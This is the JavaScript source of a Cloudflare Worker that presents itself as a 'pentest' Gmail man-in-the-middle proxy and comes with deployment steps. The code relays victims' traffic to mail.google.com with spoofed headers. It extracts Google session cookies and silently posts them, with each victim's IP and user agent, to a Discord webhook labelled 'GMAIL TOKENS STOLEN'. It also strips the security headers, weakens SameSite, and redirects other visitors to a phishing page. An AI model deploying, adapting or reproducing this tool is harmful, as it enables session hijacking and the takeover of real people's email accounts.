// Gmail MitM Proxy v2.0 - PRODUCTION PENTEST READY
// Header Spoofing + Token Theft + Session Hijack + OpSec
// Deploy: https://dash.cloudflare.com → Workers → Create → Paste → Deploy

const WEBHOOK_URL = 'https://discord.com/api/webhooks/YOUR-WEBHOOK-ID-HERE'; // ← REPLACE!

addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request));
});

async function handleRequest(request) {
  const url = new URL(request.url);
  const clientIP = request.headers.get('CF-Connecting-IP') || 'unknown';
  const userAgent = request.headers.get('User-Agent')?.substring(0, 200) || 'unknown';

  // PROXY GMAIL PATHS
  const proxyPaths = ['/mail/', '/static/', '/chrome/', '/mail/u/', '/sync/', '/accounts/'];
  if (proxyPaths.some(path => url.pathname.startsWith(path))) {
    return await proxyGmail(url, request, clientIP, userAgent);
  }

  // LANDING REDIRECT
  return Response.redirect('https://ia7353038-crypto.github.io/nINE-phish/', 302);
}

async function proxyGmail(url, request, clientIP, userAgent) {
  // PERFECT HEADER SPOOFING
  const headers = new Headers(request.headers);
  headers.set('Host', 'mail.google.com');
  headers.set('Origin', 'https://mail.google.com');
  headers.set('Referer', 'https://mail.google.com/mail/u/0/#inbox');
  headers.set('Sec-Fetch-Site', 'same-origin');
  headers.set('Sec-Fetch-Mode', 'navigate');
  headers.set('Sec-Fetch-Dest', 'document');
  headers.set('Sec-Fetch-User', '?1');
  headers.set('Upgrade-Insecure-Requests', '1');

  // TARGET mail.google.com
  url.hostname = 'mail.google.com';
  url.protocol = 'https:';

  const proxyReq = new Request(url, {
    method: request.method,
    headers,
    body: request.body,
    redirect: 'follow'
  });

  try {
    const response = await fetch(proxyReq);
    const tokens = extractTokens(response.headers.getAll('Set-Cookie') || []);

    // STEAL TOKENS
    if (tokens.length > 0) {
      await stealTokens(tokens, clientIP, userAgent, request.url);
    }

    return craftResponse(response);
  } catch (error) {
    return new Response(`Proxy Error: ${error.message}`, { status: 502 });
  }
}

function extractTokens(cookies) {
  const regex = /(SID|HSID|SSID|APISID|SAPISID|__Secure-3PSID|GAPS|G_authuser)=([^;,\s]+)/gi;
  const tokens = [];
  
  cookies.forEach(cookieStr => {
    let match;
    while (match = regex.exec(cookieStr)) {
      tokens.push({ name: match[1], value: match[2] });
    }
  });
  return tokens;
}

async function stealTokens(tokens, ip, ua, url) {
  const payload = {
    embeds: [{
      title: '🎣 GMAIL TOKENS STOLEN',
      color: 0xff6b6b,
      fields: [
        { name: '🆔 IP', value: `\`${ip}\``, inline: true },
        { name: '📱 UA', value: ua, inline: false },
        { name: '🔗 Path', value: `[${url}](${url})`, inline: false },
        { name: '🍪 Tokens', value: tokens.map(t => `\`${t.name}\`:**${t.value.slice(0,25)}...**`).join('\n'), inline: false }
      ],
      timestamp: new Date().toISOString()
    }]
  };

  fetch(WEBHOOK_URL, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload)
  }).catch(() => {}); // Silent fail

  console.log(`PHISH HIT: ${ip} | ${tokens.map(t => t.name).join(',')}`);
}

function craftResponse(response) {
  const headers = new Headers(response.headers);
  
  // BYPASS SECURITY HEADERS
  headers.delete('Content-Security-Policy');
  headers.delete('Content-Security-Policy-Report-Only');
  headers.delete('X-Frame-Options');
  headers.delete('Strict-Transport-Security');
  
  // CORS + COOKIES
  headers.set('Access-Control-Allow-Origin', '*');
  headers.set('Access-Control-Allow-Credentials', 'true');
  
  // RELAX SAMESITE
  const cookies = headers.getAll('Set-Cookie') || [];
  const relaxed = cookies.map(c => c.replace(/SameSite=(Strict|Lax)/gi, 'SameSite=None; Secure'));
  if (relaxed.length) headers.set('Set-Cookie', relaxed.join(', '));

  return new Response(response.body, {
    status: response.status,
    headers
  });
}
